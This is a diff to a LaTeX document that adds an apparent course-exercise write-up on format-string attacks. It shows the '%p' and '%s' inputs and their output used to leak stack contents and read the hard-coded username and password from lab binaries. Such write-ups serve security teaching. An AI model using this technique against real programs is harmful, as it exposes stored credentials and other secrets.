@@ -79,4 +79,25 @@
 \setcounter{exnum}{1}
 \exercise{Reading Data with Format Strings}
 
+\begin{enumerate}
+  \item Find out the frame structure of the program:
+        First, the program was called with \\\texttt{./fstr-read-2 "\%s" x}
+        This printed: \textit{Username or password invalid. Username: root}.
+        Hence, the internal stack pointer of \texttt{printf(user)} points to \texttt{validuser}.
+        This is probably some artifact of the \texttt{stcmp} functions in the \texttt{if}-block.
+  \item With \texttt{./fstr-read-2 "\%p" x} the address of the \texttt{validuser} string
+        within the text section can be located: \textit{Username or password invalid. Username: 0x804861a}.
+  \item Now a sequence of \texttt{\%p}'s was used to locate the calling frame of the \texttt{try\_login} function.
+        For this the local variables, padding bytes, old frame pointer, return address and the (other) arguments
+        need to be skipped. To locate the wanted arguments (\texttt{validuser} and \texttt{validpass})
+        in this sequence, we used the information about the address of \texttt{validuser} from above:
+        \texttt{./fstr-read-2 "\%p \%p \%p \%p \%p \%p \%p \%p \%p \%p \%p" x} prints
+        \textit{Username or password invalid. Username: 0x804861c (nil) (nil) (nil) (nil) 0xbffff808 0x80484e2 0xbffff9c3 0xbffff9e4 0x804861c 0x8048613}.
+        Obviously, the last two pointers point to the arguments in question.
+  \item Lastly, replace these arguments with \texttt{\%s}'s: (\texttt{./fstr-read-2 "\%p \%p \%p \%p \%p \%p \%p \%p \%p \%s \%s" x})
+        and get \textit{Username or password invalid. Username: 0x804861a (nil) (nil) (nil) (nil) 0xbffff828 0x80484e2 0xbffff9cf 0xbffff9f0 root passwd}
+\end{enumerate}
+
+Using this string for \texttt{fstr-read-2-extra} prints the valid username / password: \textit{smb / wannacry}.
+
 \end{document}
